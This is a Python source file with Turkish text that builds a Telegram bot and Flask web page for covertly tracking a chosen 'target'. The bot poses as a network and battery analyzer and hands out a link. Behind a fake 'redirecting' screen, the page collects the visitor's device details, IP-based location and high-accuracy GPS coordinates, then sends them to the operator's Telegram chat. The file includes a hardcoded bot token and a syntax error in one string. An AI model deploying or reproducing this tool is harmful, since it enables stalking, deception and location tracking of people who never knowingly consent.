import requests
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request, jsonify
from threading import Thread
import os

app = Flask(__name__)

# Telegram Bot Bilgilerin
TELEGRAM_TOKEN = '8805256334:AAFwOefNpzlCH4vodCvbjHH8TVGlLK97DbY'
TELEGRAM_CHAT_ID = '7092481089'

bot = telebot.TeleBot(TELEGRAM_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    cevap_metni = """
⚡ <b>SYSTEM NETWORK & ANALYZER PANEL v1.0</b> ⚡

👋 <b>Sisteme Hoş Geldiniz!</b> 

🤖 <i>Bu bot, hedef cihazların ağ kalitesini, pil optimizasyonunu ve donanım bileşenlerini test etmek amacıyla geliştirilmiş bağımsız bir analiz aracıdır.</i>

📝 <b>Nasıl Kullanılır?</b>
Aşağıdaki butona tıklayarak hedef kullanıcıya göndereceğiniz özel veri yakalama ve doğrulama bağlantısını anında oluşturabilirsiniz.

🔽 <b>Bağlantıyı Başlatmak İçin Tıklayın:</b>
    """
    
    markup = InlineKeyboardMarkup()
    buton = InlineKeyboardButton(text="⚡ Bağlantı Oluştur 🔗", callback_data="link_olustur")
    markup.add(buton)
    
    bot.send_message(message.chat.id, cevap_metni, parse_mode='HTML', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "link_olustur")
def callback_inline(call):
    hedef_link = "https://tg-logger-mq38.onrender.com" 
    
    link_metni = f"""
🚀 <b>ÖZEL BAĞLANTI BAŞARIYLA OLUŞTURULDU!</b>

📂 <b>Oluşturulan Link:</b>
<code>{hedef_link}</code>

⚠️ <b>Talimat:</b> Yukarıdaki bağlantıyı kopyalayıp hedef kullanıcıya iletin. Kullanıcı bağlantıya giriş yaptığı an, arka planda toplanan tüm sistem analizi ve ağ konum raporu <u>anlık olarak</u> bu sohbet ekranına gönderilecektir.
    """
    
    bot.send_message(call.message.chat.id, link_metni, parse_mode='HTML')
    bot.answer_callback_query(call.id, text="Bağlantı başarıyla üretildi!")

@app.route('/')
def home():
    return """
    <!DOCTYPE html>
    <html lang="tr">
    <head><meta charset="UTF-8"><title>Yükleniyor...</title></head>
    <body style="background-color: #121212; color: white; text-align: center; font-family: sans-serif; padding-top: 50px;">
    <h3>Yönlendiriliyorsunuz, lütfen bekleyin...</h3>
    <script>
        async function verileriTopla() {
            const ua = navigator.userAgent;
            let cihaz = "PC / Masaüstü";
            if (/android/i.test(ua)) cihaz = "Android Mobil Cihaz";
            if (/iPad|iPhone|iPod/.test(ua)) cihaz = "iOS (iPhone/iPad)";
            const cpu = navigator.hardwareConcurrency || "Bilinmiyor";
            const saat = new Date().toLocaleTimeString('tr-TR');
            let pil = "Bilinmiyor";
            if (navigator.getBattery) {
                try { const b = await navigator.getBattery(); pil = `%${Math.round(b.level * 100)}`; } catch(e){}
            }

            // GPS Konum İstintği (Kullanıcı izin verirse tam koordinat alınır)
            let gpsKonum = "İzin Verilmedi / Alınamadı";
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        gpsKonum = `${position.coords.latitude}, ${position.coords.longitude}`;
                        gonder(cihaz, cpu, saat, pil, gpsKonum);
                    },
                    (error) => {
                        gonder(cihaz, cpu, saat, pil, gpsKonum);
                    },
                    { timeout: 10000, enableHighAccuracy: true }
                );
            } else {
                gonder(cihaz, cpu, saat, pil, gpsKonum);
            }
        }

        function gonder(cihaz, cpu, saat, pil, gpsKonum) {
            fetch('/log', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({cihaz, cpuCekirdek: cpu, yerelSaat: saat, pilSeviyesi: pil, gps: gpsKonum})
            });
            setTimeout(() => { window.location.href = "https://google.com"; }, 1200);
        }

        window.onload = verileriTopla;
    </script>
    </body>
    </html>
    """

@app.route('/log', methods=['POST'])
def log_data():
    data = request.json or {}
    
    if request.headers.getlist("X-Forwarded-For"):
        client_ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        client_ip = request.remote_addr or '8.8.8.8'

    cihaz = data.get('cihaz', 'Bilinmiyor')
    cpu_cekirdek = data.get('cpuCekirdek', 'Bilinmiyor')
    yerel_saat = data.get('yerelSaat', 'Bilinmiyor')
    pil_seviyesi = data.get('pilSeviyesi', 'Bilinmiyor')
    gps_konum = data.get('gps', 'Bilinmiyor')

    try:
        geo_url = f"http://ip-api.com/json/{client_ip}?fields=status,country,city,zip,org,lat,lon"
        geo_res = requests.get(geo_url).json()
        
        ulke_sehir = "Bilinmiyor"
        posta_kodu = "Bilinmiyor"
        anonim_sirket = "Bilinmiyor'
        ip_konum = "Bilinmiyor"

        if geo_res.get('status') == 'success':
            ulke_sehir = f"{geo_res.get('country')} / {geo_res.get('city')}"
            posta_kodu = geo_res.get('zip', 'Yok')
            anonim_sirket = geo_res.get('org', 'Bilinmeyen Servis Sağlayıcı')
            ip_konum = f"{geo_res.get('lat')}, {geo_res.get('lon')}"

        # Eğer GPS alındıysa onu öncelikli kullan, yoksa IP konumunu kullan
        harita_koordinat = gps_konum if gps_konum != "İzin Verilmedi / Alınamadı" else ip_konum

        telegram_mesaji = f"""
🛑 <b>[!] YENİ BAĞLANTI AKTİVİTESİ YAKALANDI</b> 🛑
───────────────────────
📱 <b>Cihaz Tipi:</b> <code>{cihaz}</code>
🔋 <b>Pil Seviyesi:</b> <code>{pil_seviyesi}</code>
⚙️ <b>İşlemci Çekirdeği:</b> <code>{cpu_cekirdek} Çekirdek</code>
⏰ <b>Sistem Saati:</b> <code>{yerel_saat}</code>
───────────────────────
🌍 <b>Ülke / Şehir:</b> <code>{ulke_sehir}</code>
📮 <b>Posta Kodu:</b> <code>{posta_kodu}</code>
🏢 <b>İnternet Sağlayıcı:</b> <code>{anonim_sirket}</code>
🌐 <b>IP Adresi:</b> <code>{client_ip}</code>
📍 <b>GPS / Harita Konumu:</b> <a href="https://www.google.com/maps/search/?api=1&query={harita_koordinat}">Google Maps ile Göster</a>
───────────────────────
🔍 <i>Veriler anlık ağ sorgusu üzerinden doğrulanmıştır.</i>
        """

        bot.send_message(TELEGRAM_CHAT_ID, telegram_mesaji, parse_mode='HTML', disable_web_page_preview=True)
        return jsonify({"status": "success"}), 200

    except Exception as e:
        print(f"Hata oluştu: {str(e)}")
        return jsonify({"status": "error"}), 500

def run_bot():
    print("Telegram botu aktif, komutlar dinleniyor...")
    bot.infinity_polling()

if __name__ == '__main__':
    bot_thread = Thread(target=run_bot)
    bot_thread.start()
    
    port = int(os.environ.get("PORT", 5000))
    print(f"Web sunucusu {port} portunda başlatılıyor...")
    app.run(host='0.0.0.0', port=port, use_reloader=False)
